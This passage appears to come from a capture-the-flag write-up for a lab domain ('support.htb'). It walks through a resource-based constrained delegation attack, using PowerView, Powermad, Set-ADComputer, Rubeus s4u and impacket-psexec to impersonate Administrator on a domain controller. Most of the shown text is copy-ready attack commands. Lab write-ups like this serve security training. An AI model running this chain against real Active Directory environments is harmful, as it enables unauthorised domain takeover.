### Check the msDS-AllowedToActOnBehalfOfOtherIdentity attribute

We need to check whether this attribute is empty, because the attack changes depending on that:

**If it's empty:** you can write to it directly. This is the ideal scenario for the attack.

**If it already has a value:** you can overwrite it if you have write permissions over the object.

For this we'll use PowerView, a PowerShell module used to enumerate domain information:

```powershell
. ./PowerView.ps1
```

Now, with `Get-DomainComputer DC`:

```powershell
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
```

## Create a machine account

We'll create the machine account using Powermad:

```powershell
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

Let's verify the machine account was created:

```powershell
Get-ADComputer -Identity FAKE-COMP01
```

## Set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute

We'll set this machine account in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute so it trusts that fake machine. For that we use the `PrincipalsAllowedToDelegateToAccount` parameter, which basically translates the machine account into the Security Descriptor that ultimately gets stored in `msDS-AllowedToActOnBehalfOfOtherIdentity`:

```powershell
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

## Exploiting S4U2Self and S4U2Proxy

Since the FAKE-COMP01 machine account has permission to impersonate other users against dc.support.htb, we can request a TGS for Administrator to access the SPN `cifs/dc.support.htb`. We can do this from Windows with Rubeus.exe:

First we need to get the RC4 hash of the service account or machine account we control:

```powershell
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
```

![](/Hacked-Machines/assets/images/Pasted%20image%2020260512082953.png)

With the hash (highlighted in green) we can request the TGS for the Administrator user targeting the SPN `cifs/dc.support.htb`:

```powershell
Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```

![](/Hacked-Machines/assets/images/Pasted%20image%2020260512082548.png)

Now we have to **convert the ticket**, because it's in .kirbi, but since the idea is to use it on Linux with psexec or wmiexec, it's essential the format be .ccache:

Rubeus gave us the ticket in base64. We'll strip the newlines and whitespace so we can decode it into a file. To remove the whitespace we can use [this](https://www.browserling.com/tools/remove-all-whitespace) page.

With everything in the file, we decode it into a file:

```bash
base64 -d kerb.b64 > kerb.kirbi
```

Now we convert it from .kirbi to .ccache:

```bash
impacket-ticketConverter kerb.kirbi kerb.ccache
```

We export the ticket path into the KRB5CCNAME environment variable so it can be used by the various impacket tools:

```bash
export KRB5CCNAME=$(pwd)/kerb.ccache
```

Now we have the Administrator ticket. Let's connect to the DC using psexec (psexec uses SMB to connect, which is why it works for the cifs SPN):

```bash
impacket-psexec 'support.htb/Administrator@dc.support.htb' -no-pass -k
```

When running the command we get the error:

`[-] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED`

I fixed this by syncing my machine's time with the DC's:

```bash
sudo timedatectl set-ntp off
```
